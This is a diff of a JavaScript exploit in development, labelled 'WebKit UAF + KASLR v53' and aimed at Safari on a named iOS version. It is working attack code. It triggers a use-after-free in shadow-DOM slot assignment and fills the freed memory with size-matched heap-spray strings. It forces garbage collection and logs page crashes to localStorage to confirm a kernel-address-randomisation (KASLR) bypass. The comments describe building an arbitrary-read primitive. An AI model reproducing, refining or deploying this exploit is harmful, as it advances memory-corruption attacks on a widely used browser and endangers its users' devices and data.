+  //   So: assign(childA) [drops childB from m_manuallyAssigned → if childB has no other refs,
+  //   C++ refcount hits 0 → ~Node() RUNS SYNCHRONOUSLY → WeakPtr zeroed] → assignedNodes() → {childA}.
+  //   No window.
+  //
+  // UNLESS: childB still has another strong ref when assign(childA) drops it.
+  //   Example: childB still in the DOM (host contains childB). Then remove doesn't matter;
+  //   the DOM tree keeps a parent ref. assign(childA) drops m_manuallyAssigned ref, but
+  //   DOM parent ref is still there → refcount > 0 → ~Node() does NOT run → WeakPtr NOT zeroed.
+  //   THEN: childB.remove() → DOM parent ref dropped → if no other ref → refcount=0 → ~Node() runs.
+  //   BUT: assignedNodes() must be called BETWEEN assign(childA) and childB.remove().
+  //   In that window: m_assignedNodes still has childB WeakPtr (not zeroed yet, Node alive via DOM ref).
+  //   assignedNodes() returns childB. childB IS alive (DOM ref). Not a freed object. Not a UAF.
+  //   Still, this is the STALE m_assignedNodes behavior confirmed by v48.
+  //
+  // v51 TRUE UAF: The stale WeakPtr points to childB which IS alive (DOM ref).
+  //   This is still interesting — assignedNodes() returns a node that was removed from the slot.
+  //   It's a logic bug but not a memory corruption / arb-read primitive by itself.
+  //
+  // ACTUAL UAF WINDOW (the one path that bypasses WeakPtr zeroing):
+  //   The WeakHashMap SHRINK path is the true UAF. When SHRINK fires:
+  //   1. malloc(newBucket) → copy live entries → m_slots = newBucket → free(oldBucket)
+  //   2. effectiveCurrent() is called WHILE the old bucket is freed (if called from within
+  //      a traversal that started before SHRINK ran, reading from m_slots stale ptr).
+  //   This is the ORIGINAL Phase 4 / P6A bug path. assignedNodes() returning stale entries
+  //   is a separate, weaker bug that doesn't give arb-read on freed memory.
+  //
+  // v51 CONCLUSION: Go back to the SHRINK path. The assignedNodes() stale-childB approach
+  //   confirmed in v48 is a logic anomaly but NOT a freed-memory read.
+  //   The true UAF is SHRINK freeing oldBucket while a traversal reads from it.
+  //   v46 P6A confirmed SHRINK fires and injection works. The crash path needs:
+  //     SHRINK fires → free(oldBucket) → slotchange handler → spray reclaims oldBucket →
+  //     effectiveCurrent() reads stale m_slots ptr → reads our spray data → deref key → crash.
+  //   P6A confirmed this in Phase 4. P6B needs to replicate it with fresh cases.
+  //
+  // v51 APPROACH: Simplify P6B — remove all ghost/childB complexity.
+  //   Per-probe: fresh uafSetup case → releaseGhosts → GC → primeFreelist(arm+halfFreelist) →
+  //   armTrigger → pump(pumpCount-1) → trigger assign → AWAIT → check injected.
+  //   This is the exact Phase 4 / P6A recipe that confirmed injection=true 3/3.
+  //   Store candidate VA as the fake StringImpl key via the spray string char count.
+  //   KASLR candidate VA → charCount = (candidateVA - gigacageBase) / some_factor.
+  //   On crash: KERN_INVALID_ADDRESS = candidateVA → base confirmed.
+
+  // v51: Keep childB in m_assignedNodes stale path as DIAGNOSTIC ONLY (not UAF).
+  // The real probe is SHRINK injection path (P6A recipe exactly).
+  // freeChildB(): remove childB from DOM + register FinalizationRegistry.
+  // After GC: childB C++ freed → WeakPtr zeroed → assignedNodes() returns {childA}.
+  // Expected: syncAnomaly=false after childB freed (WeakPtr zeroed by ~Node()).
+  // This CONFIRMS WeakPtr zeroing works (not a UAF path via assignedNodes).
+  let _childBDead = false;
+  const _childBRegistry = new FinalizationRegistry(() => { _childBDead = true; });
+
+  // v51: staleChildBSetup — populate m_assignedNodes with childB WeakPtr stale entry
+  //   Step 1: assign(childA, childB) → m_assignedNodes = {childA, childB}
+  //   Step 2: assign(childA) → slot = {childA}, m_assignedNodes stale (may still have childB)
+  //   This is the v48-confirmed stale path. childB stays alive via JS ref in this closure.
+  const staleChildBSetup = () => {
+    targetSlot.assign(childA, childB);  // step A: childB enters m_assignedNodes
+    targetSlot.assign(childA);           // step B: slot={childA}, m_assignedNodes may retain childB
+  };
+
+  // v51: freeChildB — drop childB JS ref + DOM ref. Called AT PROBE TIME after GC loop.
+  //   childB.remove() → no DOM parent. _childBRef = null → JS ref gone.
+  //   If m_manuallyAssigned dropped childB (step B above), refcount → 0 → ~Node() → WeakPtr zeroed.
+  //   Expected: after freeChildB() + GC, assignedNodes() returns {childA} (ptr zeroed).
+  let _childBRef = null; // null means not held by us; non-null means v51 is holding a ref
+  const holdChildB = () => { _childBRef = childB; _childBRegistry.register(childB, null); };
+  const freeChildB = () => { childB.remove(); _childBRef = null; };
+  const isChildBDead = () => _childBDead;
+
+  // v50 ghost machinery: kept for FinalizationRegistry GC loop (ghost count only)
+  // _ghost0 / injectGhostIntoAssignedNodes / killGhost0 REMOVED in v51.
+  // releaseGhosts: simplified — just drops ghosts, no _ghost0 save, GC target = ALL ghosts.
+  let _ghost0 = null; // v51: unused, set null immediately
+  const assignGhostToSlot = () => {}; // v51: no-op
+  const nullGhost         = () => {};  // v51: no-op
+  const injectGhostIntoAssignedNodes = () => {}; // v51: no-op
+  const killGhost0 = () => {};          // v51: no-op
+
+  // v33: expose halfCharCount + newBucketCap for P6B ghost-fill strategy
+  const _halfCharCountExposed = HALF_CHAR_COUNT;
+  // newBucketCap = freedSz/2 / 16 bytes per slot (WeakHashMap slot = 16B on arm64)
+  // pumpCountForGhosts formula: cap=freedSz/16, threshold=cap/2
+  // Approximate: newBucketCap ≈ freedSz / 32  (half-size bucket, 16B/slot)
+  const _newBucketCapExposed = Math.max(4, Math.floor(freedSz / 32));
+
   return { host, targetSlot, childA, childB, pumpCount, ghosts, freedSz,
-           isInjected: () => injectionFired,
-           getPool:    () => injectionPool };
+           halfCharCount:       _halfCharCountExposed,  // v33: for P6B re-spray
+           newBucketCap:        _newBucketCapExposed,   // v33: for P6B ghost-fill count
+           isInjected:          () => injectionFired,
+           getStrings:          () => injectionStrings,
+           primeFreelist:       primeFreelist,
+           primeHalfFreelist:   primeHalfFreelist,
+           armTrigger:          () => { _triggerReady = true; },
+           releaseGhosts:            releaseGhosts,
+           assignGhostToSlot:        assignGhostToSlot,        // v51: no-op
+           injectGhostIntoAssignedNodes: injectGhostIntoAssignedNodes, // v51: no-op
+           nullGhost:                nullGhost,                // v51: no-op
+           killGhost0:               killGhost0,               // v51: no-op
+           staleChildBSetup:         staleChildBSetup,         // v51: diagnostic — childB stale WeakPtr path
+           holdChildB:               holdChildB,               // v51: keep childB JS ref alive via _childBRef
+           freeChildB:               freeChildB,               // v51: drop childB DOM+JS ref → GC eligible
+           isChildBDead:             isChildBDead,             // v51: FinalizationRegistry confirm
+           getGhostDeadCount:   () => _ghostDeadCount,
+           getSlotchangeTotal:  () => _slotchangeTotal }; // v24: slotchange fire counter
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1100,69 +1564,103 @@ function uafSetup(ghosts, pumpCount, freedSz) {
 // we immediately scan — if a buf's pattern got clobbered = bucket reuse hit.
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Size classes matching WeakHashMap bucket array sizes for ghosts=20..100
-// capacity = nextPowerOf2(ceil(ghosts × 1.3)) × 2 (after rehash doubles)
-// ghosts=20 → cap≈64 → 64×16=1024B; ghosts=50 → cap≈128 → 2048B; ghosts=100 → cap≈256 → 4096B
+// ── v12: StringImpl spray ─────────────────────────────────────────────────────
+// v11 root cause confirmed: JS ArrayBuffer backing stores live in bmalloc Gigacage
+// (a separate guarded mmap region), NOT in WTF::FastMalloc. WeakHashMap bucket
+// arrays use WTF::FastMalloc. Two completely separate heaps → ArrayBuffer spray
+// CAN NEVER reach FastMalloc slots regardless of volume or timing.
+//
+// FIX: spray with JS strings, which are backed by WTF::StringImpl → WTF::fastMalloc.
+// Same allocator as WeakHashMap bucket arrays → real overlap is possible.
+//
+// StringImpl layout (arm64, WTF source):
+//   [0..3]  : refCount (u32) — 1 for a live ref
+//   [4..7]  : length (u32)   — char count
+//   [8..11] : m_hash (u32)   — set lazily; MUST be non-zero for isLive() = true
+//   [12..15]: hashAndFlags (u32)
+//   [16+]   : char data (1B each for Latin-1 strings)
+//
+// Total StringImpl allocation size = 16B header + charCount B.
+// For freed bucket size S: charCount = S - 16.
+//
+// When stale effectiveCurrent ptr reads bytes [0..7] of our StringImpl:
+//   WeakImpl.key = u64(refCount | length<<32) = u64(1 | charCount<<32)
+//   e.g. charCount=496 → key = 0x000001F000000001 → unmapped arm64 VA → crash
+//
+// WeakImpl.m_count = bytes [8..11] = m_hash. Must be non-zero → isLive()=true.
+// Force hash computation on each string before the deref window to guarantee non-zero.
+//
+// Size classes → char counts:
+//   512B  → 496 chars
+//   1024B → 1008 chars
+//   2048B → 2032 chars
+//   4096B → 4080 chars
+
 const SPRAY_SIZES = [512, 1024, 2048, 4096];
-const PER_SIZE    = 64;   // bufs per size class
-const SENTINEL    = 0xC0FFEE42 >>> 0;
+const PER_SIZE    = 64;   // strings per size class
+
+// Build a unique string of exactly charCount Latin-1 chars.
+// Use a counter-based prefix to prevent JS engine string deduplication/interning.
+let _strCounter = 0;
+function makeSprayString(charCount) {
+  // Prefix with a counter (as chars 0x01–0x04) to ensure uniqueness.
+  // Body = 0x01 repeated. Total = charCount chars.
+  const prefix = String.fromCharCode(
+    (_strCounter & 0xFF) + 1,
+    ((_strCounter >> 8) & 0xFF) + 1,
+    ((_strCounter >> 16) & 0xFF) + 1,
+    ((_strCounter >> 24) & 0xFF) + 1
+  );
+  _strCounter++;
+  const body = '\x01'.repeat(Math.max(0, charCount - 4));
+  return prefix + body;
+}
+
+// Force hash computation on a string (sets m_hash in StringImpl → non-zero).
+// Using the string as a Map key is the most reliable way to trigger hash computation.
+const _hashForceMap = new Map();
+let _hashForceKey = 0;
+function forceStringHash(s) {
+  _hashForceMap.set(s, _hashForceKey++);
+}
+// Drain the map periodically so it doesn't grow unbounded
+function drainHashMap() { if (_hashForceMap.size > 2000) _hashForceMap.clear(); }
+
+// v32: forceHashAndRelease moved to global scope (was inside uafSetup() in v31 — caused
+//   ReferenceError in Phase 4 pre-spray which runs outside the uafSetup closure).
+// Sets m_hash on strings via a throwaway map, then clears map — strings stay primed
+//   with non-zero m_hash in their StringImpl memory without being anchored in _hashForceMap.
+// Called from: primeFreelist(), primeHalfFreelist() (inside uafSetup closure, was fine)
+//          AND: Phase 4 pre-spray blocks (outside uafSetup closure — was broken in v31)
+function forceHashAndRelease(strings) {
+  const tmp = new Map();
+  for (let i = 0; i < strings.length; i++) tmp.set(strings[i], i);
+  tmp.clear(); // release map refs — only caller's array holds strings now
+}
 
 function heapSpray() {
-  // Spray across all size classes, fill with discriminator pattern
-  const pools = {};  // size → [{buf, u32, size, idx}]
+  // Spray across all size classes using StringImpl-backed strings.
+  // StringImpl uses WTF::fastMalloc → same heap as WeakHashMap bucket arrays.
+  const pools = {};  // size → [string, string, ...]
   for (const sz of SPRAY_SIZES) {
+    const charCount = sz - 16; // StringImpl header = 16B
     pools[sz] = [];
     for (let i = 0; i < PER_SIZE; i++) {
-      const buf = new ArrayBuffer(sz);
-      const u32 = new Uint32Array(buf);
-      const tag = (0xDA000000 | (sz & 0xFFFF)) >>> 0;
-      for (let w = 0; w < u32.length; w++)
-        u32[w] = (tag | (i & 0xFF) | ((w & 0xFF) << 8)) >>> 0;
-      pools[sz].push({ buf, u32, size: sz, idx: i });
+      const s = makeSprayString(charCount);
+      forceStringHash(s); // ensure m_hash != 0
+      pools[sz].push(s);
     }
+    drainHashMap();
   }
   const total = SPRAY_SIZES.reduce((s,sz) => s + PER_SIZE, 0);
-  log(`[SPRAY] ${total} bufs across sizes ${SPRAY_SIZES.join('/')}B`);
+  log(`[SPRAY] v13: ${total} StringImpl strings across sizes ${SPRAY_SIZES.join('/')}B (WTF::fastMalloc)`);
   return pools;
 }
 
 // Release a pool to let allocator reuse those slots for the incoming free
 function releasePool(pools, sz) {
   if (!pools[sz]) return;
-  pools[sz] = null;  // GC can reclaim
-}
-
-// Refill a pool immediately after trigger — if freed bucket reused a slot,
-// new allocation at same size lands adjacent; check if any buf got clobbered.
-function refillAndScan(sz, prevPool) {
-  // Allocate fresh bufs at same size
-  const fresh = [];
-  for (let i = 0; i < PER_SIZE; i++) {
-    const buf = new ArrayBuffer(sz);
-    fresh.push({ buf, u32: new Uint32Array(buf), size: sz, idx: i });
-  }
-  // Scan the PREVIOUS pool bufs — clobber = allocator wrote bucket data there
-  const hits = [];
-  if (prevPool) {
-    for (const s of prevPool) {
-      if (!s) continue;
-      const u = s.u32;
-      const expectedTag = (0xDA000000 | (sz & 0xFFFF)) >>> 0;
-      // Check first 4 words — if != our pattern, something wrote here
-      let clobbered = false;
-      for (let w = 0; w < Math.min(4, u.length); w++) {
-        const expected = (expectedTag | (s.idx & 0xFF) | ((w & 0xFF) << 8)) >>> 0;
-        if (u[w] !== expected) { clobbered = true; break; }
-      }
-      if (clobbered) {
-        hits.push({
-          size: sz, idx: s.idx,
-          raw: Array.from(u.slice(0, 8)).map(x => x.toString(16).padStart(8,'0')).join(' ')
-        });
-      }
-    }
-  }
-  return { fresh, hits };
+  pools[sz] = null;  // GC can reclaim string refs → FastMalloc returns slots to free-list
 }
 
 // Check assignedNodes() return for anomalies:
@@ -1181,32 +1679,128 @@ function checkNodeLeak(nodes, expectedNode) {
 
 
 (async () => {
-  log('=== WebKit UAF + KASLR v2 ===');
+  log('=== WebKit UAF + KASLR v53 (P6B: bonus pumps post-SHRINK → 2nd amortizedCleanup → fake bucket traversal → KERN_INVALID_ADDRESS) ===');
   log('=== Target: iOS 26.5.2 / safari-7625.1.29.11 / A16 arm64e ===');
   log('=== UAF: ManualSlotAssignment WeakHashMap rehash (rdar://179729192) ===\n');
+
+  // v21: hoist P6_PAGE to IIFE scope — was block-scoped in P6 if() block, causing
+  // ReferenceError at line ~2194 (summary section) when referenced outside that block.
+  const P6_PAGE = 16384; // iOS/WebKit page size, 16KB on arm64
+
+  // ── v53: auto-retry state keys ───────────────────────────────────────────────
+  // p6b_probe     = checkpoint written BEFORE each probe, removed after — if present on reload = crash signal
+  // p6b_autoretry = {count, gigacageBase, candidates, highConf} — carry oracle results through reloads
+  // p6b_retry_count = integer retry counter (0-19)
+  const P6B_PROBE_KEY   = 'p6b_probe';
+  const P6B_RETRY_KEY   = 'p6b_autoretry';
+  const P6B_RETRY_MAX   = 20;
+
+  // ── P6B crash-recovery: check if prior run crashed mid-probe ────────────────
+  // If the UAF traversal derefs a bad key VA, the WebContent process dies.
+  // JS try/catch can't catch it. But we save a checkpoint to localStorage
+  // BEFORE each probe. On reload, if p6b_probe key exists = prior run crashed.
+  try {
+    const _p6bCp = localStorage.getItem(P6B_PROBE_KEY);
+    if (_p6bCp) {
+      const _cp = JSON.parse(_p6bCp);
+      localStorage.removeItem(P6B_PROBE_KEY);
+      // also clear retry state — crash = done
+      try { localStorage.removeItem(P6B_RETRY_KEY); } catch(_) {}
+      try { localStorage.removeItem('p6b_retry_count'); } catch(_) {}
+      const _hitVA = BigInt(_cp.va);
+      const _gigaBase = BigInt(_cp.gigacageBase || '0x200000000000');
+      const _offset = _hitVA - _gigaBase;
+      log(`\n[P6B HIT] ✓✓✓ Page crashed on prior probe — HARD UAF signal!`);
+      log(`[P6B HIT]   probe idx=${_cp.idx}  VA=${_cp.va}`);
+      log(`[P6B HIT]   gigacageBase=0x${_gigaBase.toString(16)}`);
+      log(`[P6B HIT]   spray offset=0x${_offset.toString(16)}`);
+      log(`[P6B HIT]   → UAF arb-read PRIMITIVE CONFIRMED ← HARD SIGNAL`);
+      log(`[P6B HIT]   → KASLR candidate offset 0x${_offset.toString(16)} is correct`);
+      log(`[P6B HIT]   Verify: check Settings→Analytics→WebContent crash for KERN_INVALID_ADDRESS`);
+      log(`[P6B HIT]   Expected faulting_address ≈ ${_cp.va}`);
+      log('═'.repeat(60));
+      return; // halt — don't re-run phases
+    }
+  } catch(_) {}
+
+  // ── v53: auto-retry resume — restore oracle results from prior run ─────────
+  // If we get here after a reload triggered by auto-retry (p6b_autoretry present),
+  // skip the full oracle + phases 1-5 and jump straight to P6B with saved state.
+  let _v52RetryState = null;
+  try {
+    const _rStr = localStorage.getItem(P6B_RETRY_KEY);
+    if (_rStr) {
+      _v52RetryState = JSON.parse(_rStr);
+      const _rc = parseInt(localStorage.getItem('p6b_retry_count') || '0');
+      log(`\n[v53 AUTO-RETRY] Resuming retry ${_rc}/${P6B_RETRY_MAX}`);
+      log(`[v53 AUTO-RETRY]   gigacageBase=0x${_v52RetryState.gigacageBase}`);
+      log(`[v53 AUTO-RETRY]   candidates=${_v52RetryState.candidates.length}`);
+      log(`[v53 AUTO-RETRY]   Skipping oracle — jumping to P6B probe sweep`);
+      log('');
+    }
+  } catch(_) { _v52RetryState = null; }
 
   if (!self.SharedArrayBuffer) {
     log('[!] SharedArrayBuffer unavailable — need COOP/COEP headers or file:// with flags');
     return;
   }
 
-  // ─── Phase 1: KASLR Oracle ───────────────────────────────────────────────
-  log('[*] Phase 1: KASLR Oracle (v19)...\n');
-  const oracleResult = await runOracle();
+  // ── v53: fast path — skip oracle + phases 1-5 when resuming auto-retry ────
+  // On retry reload, _v52RetryState has gigacageBase + candidates from saved oracle.
+  // Stub out the phase 1-5 variables Phase 6 references so it can run with saved state.
+  let sprayHex, highConf, scores, sprayPools, allCases, caseGroups, totalCases;
+  let totalInjections = 0, nodeAnomalies = 0, uafExceptions = 0, elapsed = 0;
+  let hardConfirmed = false, mediumConfirmed = false, softSignal = false;
+  let clobberLog = [], nodeAnomalyLog = [];
 
-  if (!oracleResult) {
-    log('\n[!!!] Oracle failed all attempts — aborting UAF phase');
-    return;
-  }
+  // v52: hardForceGC hoisted — used by phases 3-4 GC loop AND P6B GC loop.
+  // Must live outside the gated phases 3-4 block so P6B can call it on retry.
+  const hardForceGC = async (label) => {
+    log(`[GC] ${label} — allocating 5×20MB...`);
+    for (let round = 0; round < 5; round++) {
+      let p = [];
+      for (let i = 0; i < 20; i++) p.push(new ArrayBuffer(1024 * 1024)); // 20MB
+      p = null;
+      await new Promise(r => setTimeout(r, 120)); // yield — let GC run + event loop breathe
+    }
+    log(`[GC] ${label} done`);
+  };
 
-  const { sprayHex, highConf, scores } = oracleResult;
-  log(`\n[*] Oracle done: ${sprayHex.length} spray addresses, HIGH=${highConf.length}`);
+  if (_v52RetryState) {
+    // Restore just what Phase 6 references from saved state
+    sprayHex = _v52RetryState.candidates; // hex strings, used only as fallback
+    highConf = _v52RetryState.candidates.map((c, i) => ({ c: Math.floor(Number(c) / 16384), score: 1, va: '0x' + (BigInt('0x' + _v52RetryState.gigacageBase) + BigInt(Number(c))).toString(16), breakdown: {} }));
+    scores = [];
+    sprayPools = null;
+    allCases = [];
+    caseGroups = {};
+    totalCases = 0;
+    log('[v53] Retry path: skipping oracle + phases 1-5, jumping to Phase 6B');
+  } else {
+    // ─── Phase 1: KASLR Oracle ───────────────────────────────────────────────
+    log('[*] Phase 1: KASLR Oracle (v19)...\n');
+    const oracleResult = await runOracle();
+
+    if (!oracleResult) {
+      log('\n[!!!] Oracle failed all attempts — aborting UAF phase');
+      return;
+    }
+
+    ({ sprayHex, highConf, scores } = oracleResult);
+    log(`\n[*] Oracle done: ${sprayHex.length} spray addresses, HIGH=${highConf.length}`);
+  } // end else (_v52RetryState)
 
   // ─── Phase 2: Initial spray across size classes ──────────────────────────
-  log('\n[*] Phase 2: Heap spray (size-matched to WeakHashMap bucket arrays)...');
-  await new Promise(r => setTimeout(r, 100));
-  let sprayPools = heapSpray();
-  await new Promise(r => setTimeout(r, 100));
+  // v53: skip on retry — Phase 6B builds its own fresh pool per probe
+  if (!_v52RetryState) {
+    log('\n[*] Phase 2: Heap spray (size-matched to WeakHashMap bucket arrays)...');
+    await new Promise(r => setTimeout(r, 100));
+    sprayPools = heapSpray();
+    await new Promise(r => setTimeout(r, 100));
+    log('[*] Spray in place');
+  } else {
+    log('[v53] Retry: skipping phase 2 heap spray');
+  }
   log('[*] Spray in place');
 
   // ─── Phase 3: UAF Setup ──────────────────────────────────────────────────
@@ -1221,28 +1815,111 @@ function checkNodeLeak(nodes, expectedNode) {
   // the m_slots WeakHashMap op counter by 2 (one ensure() per removed+added child).
   // After cap/2 pump calls (~cap ops total), amortized cleanup fires on next ensure().
 
-  const caseGroups = {};
-  for (let ghosts = 10; ghosts <= 120; ghosts += 10) {
+  // v22: 3 ghost counts with CORRECTED opCount math (pumpCount = threshold - g - 1).
+  // v19-v21 used pumpCount=threshold-g-2 — off by 1 because i=0 pump only adds +1 op
+  // (childA already in slot after releaseGhosts, so first assign(childA) only removes childB).
+  // v13-v18 used ghost counts [20, 30, 50] — ALL WRONG (g=20 gives pumpCount<0).
+  // Valid ghost counts where pumpCount≥1 AND one cleanup fires during releaseGhosts:
+  //   ghosts=28  → cap=64,  threshold=32  → freed=1024B → pumpCount=3  ✓
+  //   ghosts=50  → cap=128, threshold=64  → freed=2048B → pumpCount=13 ✓
+  //   ghosts=100 → cap=256, threshold=128 → freed=4096B → pumpCount=27 ✓
+  // v18: uafSetup is now SYNCHRONOUS (no internal awaits).
+  // Granular log + yield AROUND each call so screen updates between cases.
+  // After ALL cases built → call releaseGhosts() on each → THEN forceGC().
+  // This is the correct order:
+  //   build all → release all ghost refs safely → GC pressure → WeakPtrs die → pump+trigger.
+  // v53: skip phase 3 on retry (P6B builds fresh pool per probe)
+  if (!_v52RetryState) {
+  caseGroups = {};
+  allCases = [];
+  for (const ghosts of [28, 50, 100]) {
+    log(`[P3] uafSetup g=${ghosts} start...`);
+    await new Promise(r => setTimeout(r, 0)); // yield → log visible on screen before work
+
     const freedSz = freedBucketSizeForGhosts(ghosts);
     const matchedSz = SPRAY_SIZES.reduce((prev, cur) =>
       Math.abs(cur - freedSz) < Math.abs(prev - freedSz) ? cur : prev);
     if (!caseGroups[matchedSz]) caseGroups[matchedSz] = [];
-    // Sweep pump count: exact threshold and ×1.5 and ×2 (jitter in cleanup timing)
     const base = pumpCountForGhosts(ghosts);
-    for (const mult of [1.0, 1.25, 1.5, 2.0])
-      caseGroups[matchedSz].push(uafSetup(ghosts, Math.ceil(base * mult), matchedSz));
+
+    log(`[P3] g=${ghosts} creating host+shadow+slots...`);
+    await new Promise(r => setTimeout(r, 0));
+
+    let c;
+    try {
+      c = uafSetup(ghosts, base, matchedSz);
+    } catch(e) {
+      log(`[P3] ERROR in uafSetup g=${ghosts}: ${e.name}: ${e.message}`);
+      log(`[P3] Stack: ${e.stack}`);
+      continue;
+    }
+
+    log(`[P3] g=${ghosts} uafSetup returned — ghostElems populated, slot assigned`);
+    await new Promise(r => setTimeout(r, 0));
+
+    caseGroups[matchedSz].push(c);
+    allCases.push(c);
+    log(`[P3] uafSetup g=${ghosts} DONE (freedSz=${freedSz} pumpCount=${base})`);
+    await new Promise(r => setTimeout(r, 0));
   }
-  const totalCases = Object.values(caseGroups).reduce((s,v) => s+v.length, 0);
+  totalCases = Object.values(caseGroups).reduce((s,v) => s+v.length, 0);
   log(`[*] ${totalCases} UAF cases built (freed sizes: ${Object.entries(caseGroups).map(([k,v])=>k+'B×'+v.length).join(', ')})`);
   log(`[*] Pump mechanism: alternating assign(childA/childB) → m_slots.ensure() × 2/call`);
 
-  // GC to null ghost WeakPtrs → dead entries accumulate in m_slots
-  log('[*] GC pressure to null ghost WeakPtrs...');
-  forceGC();
-  await new Promise(r => setTimeout(r, 300));
-  forceGC();
-  await new Promise(r => setTimeout(r, 200));
+  // v18: releaseGhosts on ALL cases BEFORE forceGC.
+  // This is the KEY fix — ghost C++ elements are kept alive in ghostElems[] during
+  // uafSetup so no premature death during ensure(). Now we safely release them:
+  //   ghostElems.forEach(g => g.remove())  → remove from host
+  //   ghostSlot.assign()                   → fires N slotManualAssignmentDidChange
+  //                                           (releases m_manuallyAssignedElements refs)
+  //                                           ghostElems still populated → no premature death
+  //   ghostElems.length = 0                → JS refs gone → WeakPtrs eligible to die after GC
+  log('[*] Releasing ghosts (v18 safe releaseGhosts)...');
+  await new Promise(r => setTimeout(r, 0));
+  for (const c of allCases) {
+    log(`[P3] releaseGhosts g=${c.ghosts}...`);
+    c.releaseGhosts();
+  }
+  log('[*] All ghost JS refs released — WeakPtrs will die on next GC cycle');
+  await new Promise(r => setTimeout(r, 0));
+
+  // v23: FinalizationRegistry-confirmed GC loop.
+  // v21 used 3 fixed rounds × 100MB. Turned out insufficient on A16 because:
+  //   - JSC ArrayBuffer pressure only triggers Eden GC (young-gen collection).
+  //   - Ghost elements created earlier survive Eden GC → promoted to old-gen.
+  //   - Old-gen (major) GC only fires when heap is truly full → need sustained pressure.
+  // v23 fix: loop GC rounds until ALL ghost FinalizationRegistry callbacks fire,
+  // confirming JSC has finalized the JS wrappers and decremented C++ refcounts to 0.
+  // FinalizationRegistry.register() was called in releaseGhosts() before ghostElems.length=0.
+  // Each callback increments getGhostDeadCount() for its case. Total = sum over all cases.
+  // hardForceGC hoisted to top-level (above phases 3-4 block) in v52 — do not redefine here.
+
+  const totalGhosts = allCases.reduce((s, c) => s + c.ghosts, 0);
+  const getDeadTotal = () => allCases.reduce((s, c) => s + c.getGhostDeadCount(), 0);
+  const GC_TIMEOUT_MS = 45000; // 45s timeout — give Safari plenty of time for old-gen GC
+  const GC_ROUND_INTERVAL_MS = 400;
+
+  log(`[GC] v23: waiting for FinalizationRegistry confirmation (${totalGhosts} ghosts total)...`);
+  const gcStart = Date.now();
+  let gcRound = 0;
+  while (getDeadTotal() < totalGhosts) {
+    if (Date.now() - gcStart > GC_TIMEOUT_MS) {
+      log(`[GC] ⚠ TIMEOUT ${GC_TIMEOUT_MS/1000}s — ${getDeadTotal()}/${totalGhosts} ghosts confirmed dead`);
+      log(`[GC] ⚠ Proceeding anyway — WeakPtrs may still be alive, UAF shrink may not fire`);
+      log(`[GC] ⚠ If no signal, reload and give Safari more time (close other tabs first)`);
+      break;
+    }
+    await hardForceGC(`round ${++gcRound} (dead=${getDeadTotal()}/${totalGhosts})`);
+    await new Promise(r => setTimeout(r, GC_ROUND_INTERVAL_MS));
+    document.body.offsetHeight; // force layout — helps WebKit flush DOM GC roots
+  }
+  if (getDeadTotal() >= totalGhosts) {
+    log(`[GC] ✓ ALL ${totalGhosts} ghost JS wrappers finalized (${gcRound} rounds, ${Date.now()-gcStart}ms)`);
+    log(`[GC] ✓ WeakPtrs in targetSlot.m_slots confirmed null — pump+trigger will see dead entries`);
+  }
+  await new Promise(r => setTimeout(r, 500)); // brief settle after final GC round
   document.body.offsetHeight;
+  log(`[GC] done — ghost WeakPtrs ${getDeadTotal() >= totalGhosts ? 'CONFIRMED null' : 'MAY still be alive'} (${getDeadTotal()}/${totalGhosts} confirmed)`);
 
   // ─── Phase 4: Trigger — assign() pump → slotchange injection ─────────────
   //
@@ -1269,12 +1946,12 @@ function checkNodeLeak(nodes, expectedNode) {
   //
   log('\n[*] Phase 4: Triggering UAF (assign() pump + slotchange injection)...');
 
-  let uafExceptions = 0;
-  let nodeAnomalies = 0;
-  let totalInjections = 0;   // cases where slotchange fired during final assign
+  uafExceptions = 0;
+  nodeAnomalies = 0;
+  totalInjections = 0;   // cases where slotchange fired during final assign
   let totalExtraFires = 0;   // impossible to count differently here, just track
-  const clobberLog = [];
-  const nodeAnomalyLog = [];
+  clobberLog = [];
+  nodeAnomalyLog = [];
   const t0 = performance.now();
 
   for (const [szStr, cases] of Object.entries(caseGroups)) {
@@ -1287,32 +1964,71 @@ function checkNodeLeak(nodes, expectedNode) {
     for (const c of cases) {
       try {
         const { host, targetSlot, childA, childB, pumpCount,
-                ghosts, freedSz, isInjected, getPool } = c;
+                ghosts, freedSz, isInjected, getStrings, primeFreelist, primeHalfFreelist, armTrigger } = c;
+
+        // ── v24 Fix: pre-trigger spray — allocate + RELEASE strings before trigger ──
+        // Strategy: flood 4096 strings of freed-bucket size → null immediately → GC tick.
+        // Strings hit LIFO freelist before the UAF trigger fires. When shrink frees old_bucket,
+        // the subsequent slotchange injection then floods AGAIN → high probability of overlap.
+        // Two-wave strategy: pre-wave (freed before trigger) + injection wave (in slotchange).
+        let primedStrings = primeFreelist();
+        // v24: primedStrings now actually freed to LIFO (primeFreelist no longer uses _hashForceMap)
+        primedStrings = null;
+
+        // v30: HALF-SIZE prime — prime the freedSz/2 bin so SHRINK's malloc(freedSz/2) lands on our fakes
+        // SHRINK calls malloc(newCap=oldCap/2) BEFORE free(oldCap) → half-size bin must be primed NOW
+        // After prime, null immediately so those slots are on LIFO top when SHRINK fires
+        let primedHalfStrings = primeHalfFreelist();
+        primedHalfStrings = null;
+        log(`[UAF-v31] g=${ghosts} half-prime done (m_hash≠0, size=${Math.floor(freedSz/2)}B) → SHRINK malloc will claim our slot`);
+
+        // v24: pre-trigger spray wave — additional 1024 strings released right before trigger
+        // v27: STR_CHAR_COUNT is inside uafSetup() closure — use freedSz-16 directly (same value)
+        // v31: also forceHashAndRelease on pre-spray so m_hash ≠ 0 in those slots too
+        {
+          const _preCharCount = freedSz - 16;
+          const preSpray = [];
+          for (let i = 0; i < 1024; i++) preSpray.push(makeSprayString(_preCharCount));
+          forceHashAndRelease(preSpray); // v31: m_hash ≠ 0 before releasing to freelist
+          // null immediately — flood freelist with hashed (isLive-eligible) StringImpls
+        }
+        // v30: also pre-spray at half size; v31: hash them
+        {
+          const _halfPreCount = Math.max(1, Math.floor(freedSz / 2) - 16);
+          const halfPreSpray = [];
+          for (let i = 0; i < 1024; i++) halfPreSpray.push(makeSprayString(_halfPreCount));
+          forceHashAndRelease(halfPreSpray); // v31: m_hash ≠ 0 in half-size pre-spray
+          // null immediately
+        }
+        // v31: DOUBLE GC tick — two setTimeout(0) rounds to ensure primed slots are
+        // actually on bmalloc LIFO before the trigger fires SHRINK's malloc(freedSz/2).
+        // Single tick (v24) may not be enough for JSC to collect and return to allocator.
+        await new Promise(r => setTimeout(r, 0));
+        await new Promise(r => setTimeout(r, 0));
 
         // ── Pump: alternate assign(A) / assign(B) to increment m_slots op counter.
